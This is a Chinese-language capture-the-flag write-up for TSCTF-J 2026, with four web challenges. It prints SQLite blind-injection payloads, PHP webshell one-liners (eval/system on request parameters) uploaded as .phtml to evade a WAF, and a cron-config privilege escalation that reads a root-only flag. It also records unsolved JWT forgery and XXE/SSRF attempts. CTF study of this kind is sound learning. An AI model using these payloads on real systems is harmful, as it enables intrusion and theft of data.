---
title: 【TSCTF-J2026】WP
published: 2026-10-16
description: 第一次打 CTF 正赛的题解与复盘：手工 hex 盲注读表名，图形马翻车后改用 phtml 绕 WAF 拿 RCE 提权读 flag，另外两道没做出来的题也老实记了过程和卡点。
tags: [WP, CTF, Web]
category: WP
draft: false
---

> 这篇文章记录的是正赛部分的解题过程。预赛（真实资产挖掘）那部分因为涉及还在披露流程中的目标，暂不上传。
>
> 📑 所有 WP 的总目录在 [WP 索引](/wp/)。

正赛表现很一般，有很多不会的东西，我尽可能将我的解题过程简述，并对遇到的困难进行简单分析与思考
### 一、好想玩原神

1.这道题挺别出心裁的，上来就是一个登录框，尝试信息收集但没发现什么，于是抓包发现账号密码泄露
![图 9](/images/tsctf-2026/01.webp)  
但尝试登陆后并没有发现有用的信息
![图 10](/images/tsctf-2026/02.webp)  


2.登陆界面的操作性很多，尝试sql注入
其中"OperationalError"是SQLite的典型报错
![图 11](/images/tsctf-2026/03.webp)  

3.发现注入点,确认为字符型（and或者or语句之间存在空格过滤，已经自动省略）
```sql
'or'1'='1
```
![图 13](/images/tsctf-2026/04.webp)
```sql
'and'1'='2
```  
![图 15](/images/tsctf-2026/05.webp)  
```sql
'or(select(1))=(1)or'1'='2
```
![图 14](/images/tsctf-2026/06.webp)  

已经确认sqlite数据库，这里打算使用hex来破解，这个比ascii编码更高效(各位师傅复现的时候用复制记得把换行删掉，这里的正确反应应该是200)
```sql
'and((select(substr(hex(substr((select(group_concat(name))from(sqlite_master)where(type)='table'),1,1)),1,1)))like'0')and'1'='1
```
分别对字符串、hex高位低位、十六进制字符进行集束炸弹攻击，得出哈希值，整理后得出表名

字符串用数值1~60，hex用1~2，十六进制0~F（记得把线程数拉低一点）
![图 16](/images/tsctf-2026/07.webp)
![图 0](/images/tsctf-2026/08.webp)  
用长度筛选，右上角保存导出结果表数据.csv文件用excel查看

先对A列分列，长度筛选把无关数据删掉，全选数据进行排序整理
![图 1](/images/tsctf-2026/09.webp)  
插入hex值的行
在E2位置使用
```xlsx
=IF(B2=B3,D2&D3,"")
```
![图 2](/images/tsctf-2026/10.webp)  
下拉得到全部hex值，去解码器解码，得到表名
![图 17](/images/tsctf-2026/11.webp) 

同理得出列名（如果长度不够第一个payload可以拉1~200）
```sql
'and((select(substr(hex(substr((select(sql)from(sqlite_master)where(name)='secret_flags'),1,1)),1,1)))like'0')and'1'='1
```
![图 4](/images/tsctf-2026/12.webp)  

![图 3](/images/tsctf-2026/13.webp)  
再同理得到flag
```sql
'and((select(substr(hex(substr((select(group_concat(flag_value))from(secret_flags)),1,1)),2,1)))like'0')and'1'='1
``` 
![图 21](/images/tsctf-2026/14.webp)  

由于本人并不熟练掌握python，没办法直接写脚本一键爆破，只能用这么曲折的方式了()

### 二、玛德莱娜的小蛋糕
这道题的难点就是木马的注入和绕过waf

1.题目给出一个文件上传入口，凭直觉识别出是木马题


(错误思路)尝试各种代码想与gif文件结合造出图形马，但是毫无意外的报500（直接改php会被识别出，我用了phtml绕过）

分别用了
  ```php
  GIF89a<?php @eval($_POST['a']); ?>
  ```
   ```php
  GIF89a<?=@$_REQUEST['a'](@$_REQUEST['b']); ?>
  ```
![图 22](/images/tsctf-2026/15.webp) 
配合一张名为1.gif的文件制作图形马
 ```cmd
copy /b 1.gif + shell.php exploit.gif
```
![图 23](/images/tsctf-2026/16.webp) 
但最后上传后查看全是500

查询ai得知是waf抓取文件的二进制流？（有待考证）

2.转换思路，直接造phtml文件，绕过waf，上传成功，并且不造成500,发现flag
```php
GIF89a<?=@print_r(@scandir('/'))?>
```
![图 24](/images/tsctf-2026/17.webp)  
![图 25](/images/tsctf-2026/18.webp)  

3.但在获取flag时发现权限不足无法访问完整flag，只有一个命令头，尝试绕过权限控制

由Wappalyzer插件可知，服务器系统为linux(Debian是其的发行版)
![图 5](/images/tsctf-2026/19.webp)  
```php
GIF89a<?=system($_GET['c']); ?>
```
利用命令创建phtml文件，上传后确认权限(已拿到RCE)
![图 6](/images/tsctf-2026/20.webp)  
```html
?c=ls%20-la%20/
```
权限600
![图 7](/images/tsctf-2026/21.webp)  
查看etc等等
![图 8](/images/tsctf-2026/22.webp)  
![图 9](/images/tsctf-2026/23.webp)  
再cat一下
![图 13](/images/tsctf-2026/24.webp)  
![图 12](/images/tsctf-2026/25.webp)  
意味着root用户会直接读取并执行/var/lib/teahouse/cleanup.conf,查看发现有写入权限
![图 14](/images/tsctf-2026/26.webp)
写入复制flag命令  
```
?c=echo%20cp%20/flag%20/var/www/html/storage/tmp/o.phtml%20%3E%20/var/lib/teahouse/cleanup.conf
```
写入权限修改命令,直接让它覆写到o.phtml,等待1分钟刷新后访问o.phtml
```
?c=echo%20chmod%20666%20/var/www/html/storage/tmp/o.phtml%20%3E%3E%20/var/lib/teahouse/cleanup.conf
```
 ![图 15](/images/tsctf-2026/27.webp)  

  

## 以下是暂未解出的题目（有 agent 介入）


### 三、bandinvite


这题是一个后台题，题目给了一个后台的登录入口
注册账号成为普通用户，查询js文件，获取前端路由与接口定义
![图 16](/images/tsctf-2026/28.webp)  

普通用户无法浏览后台重要内容，尝试越权

1.尝试直接解码jwt将user改为admin
![图 17](/images/tsctf-2026/29.webp)  
![图 18](/images/tsctf-2026/30.webp)  


2.算法混淆（alg: none）：构造 {"alg": "none", "typ": "JWT"}，删除签名（失败，后端强制使用 HS256，返回 401）
![图 21](/images/tsctf-2026/31.webp)  
![图 22](/images/tsctf-2026/32.webp)  
没有kid 注入：检查 JWT Header，确认没有 kid 参数，不存在路径穿越或 SQL 注入的可能

3.弱密钥离线爆破：使用vulnclaw，直接命令本地离线爆破（失败，密钥不是常见弱口令）


4.ip伪造xff等均无效
![图 19](/images/tsctf-2026/33.webp)  

5.vite任意文件读取，尝试利用 @fs/ 读取 /app/frontend/vite.config.js, /app/backend/app.py, /etc/passwd 等敏感文件（均为404）
![图 20](/images/tsctf-2026/34.webp)  


思考：按照出题人的提示，这应该是ssti漏洞，但我并没有找到除了管理员外的其他用户能访问/api/previwe触发ssti的入口，尝试了多种方法都没有成功，可能是我对ssti漏洞的理解不够深入，或者是题目本身有一些隐藏的条件没有被满足

如果不是提权的话，可能是我在信息收集阶段遗漏了某些关键点，导致无法触发漏洞

### 四、mineprotrait

这题是一道xxe?

1、我通过爬虫发现www.zip


![图 23](/images/tsctf-2026/35.webp)  
里面有出题人提供的账号和密码，也有flag的信息
![图 24](/images/tsctf-2026/36.webp)  
![图 25](/images/tsctf-2026/37.webp)  


2、登陆账号后发现图片格式转换器
   抓包发现：目标格式为 JPG/WEBP 时，由前端 JS 完成本地转换（不走网络请求）；目标格式为 PNG 时，表单才真正发往后端/convert 接口（由后端渲染器解析 SVG 并回传 Base64 图片）
![图 26](/images/tsctf-2026/38.webp)  

3、 推断为漏洞XXE

通过审计 /convert 的后端处理逻辑，结合 old_note.txt 中的提示，推断后端在解析 SVG 时存在 XXE（XML 外部实体注入）漏洞尝试构造标准 XXE Payload：

```xml
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt"> ]>
```

尝试将其放入 <text> 标签内渲染。

4、 对抗过程与绕过尝试（所有尝试均被死锁）

标准 XXE 被 WAF 拦截

直接上传包含 <!DOCTYPE 和 <!ENTITY 的 UTF-8 SVG，被 WAF 拦截，后端返回 4280 长度的图片，OCR 识别提示：“The Junimos found sensitive keywords within your XML. Go refine it!”
![图 27](/images/tsctf-2026/39.webp)  

waf设置了针对 <!DOCTYPE、<!ENTITY 等正则关键字的黑名单

编码绕过（尝试了所有已知编码）

UTF-16 LE/BE + BOM：WAF 成功绕过（长度变为 3601 兜底图，非 WAF 拦截），但后端 Python 渲染器（CairoSVG）无法解析 UTF-16 编码，抛出异常

UTF-32 LE + BOM：同上，WAF 放行，但渲染器崩溃
![图 29](/images/tsctf-2026/40.webp)  

UTF-7：+ADw-!DOCTYPE 形式被 WAF 识别并拦截（触发了敏感词），说明 WAF 具备多编码解码能力
![图 28](/images/tsctf-2026/41.webp)  

XInclude：<xi:include href="php://filter/..."> 绕过 WAF（无敏感词），但渲染器完全不支持 XInclude 标签，直接崩溃

Gzip 压缩：尝试 Content-Encoding: gzip，但后端 Python BaseHTTP 服务器未开启 gzip 解码支持

SSRF 内网探测绕过
尝试利用渲染器 SSRF 请求内网 fetch.php：将 <image href="http://127.0.0.1:8080/fetch.php?..."> 注入 SVG

IP 黑名单绕过：WAF 拦截 127.0.0.1 等常见本机地址，尝试 localtest.me、0.0.0.0、0x7f000001 等绕过
fetch.php 返回的是纯文本的 Base64 flag，而渲染器必须拿到合法的图片流，遇到纯文本直接崩溃

控制变量测试（确认渲染器本身正常）

上传不含 XXE 恶意代码的纯文本 SVG（<text>Hello TSCTF</text>，纯 UTF-8），后端成功渲染并回显图片
证明渲染器（CairoSVG）本身工作正常，未损坏
![图 30](/images/tsctf-2026/42.webp)  

 异常吞没机制
无论哪种绕过方式（UTF-16、UTF-7、XInclude、SSRF），最终返回的都是 3600 长度的兜底空白图（“Portrait conversion completed”）。
后端代码使用了 try...except，当渲染器崩溃时，异常被强行捕获并吞掉，系统为了不报错，返回了固定的兜底占位图

死锁闭环
纯 UTF-8 + XXE -> WAF 拦截（4280）
非 UTF-8（绕过 WAF） -> 渲染器崩溃 + 异常被吞 -> 3600 兜底图
前端本地转换（JPG/WEBP） -> 未发往后端，无法触发 XXE。

思考：在当前靶机环境下，WAF 的严格拦截与后端渲染器“吞掉所有非 UTF-8 异常”的机制产生了不可调和的冲突，导致任何 XXE 或 SSRF 的回显通道被堵死，可能别人有办法能够在绕过waf的同时得到回显吧，但是我没能找到

## 总结

我目前的基础尚未牢固，还有很多地方才刚入门，遇到了很多超出能力的问题，但我并不打算因此放弃，我后续还想投入时间继续提高自身的能力

尽管本次比赛在电脑前坐牢了几十个小时，但这也是在不断学习的过程，也算有了一些收获吧，以后还想参加ctf

我发现这种比赛没人带会非常艰难，无论是信息的获取还是方向的直到，新手还是有点难分辨哪些是有用的，学起来的顺序也比较杂乱，只能说希望能得到更系统的学习

最后感谢你的观看
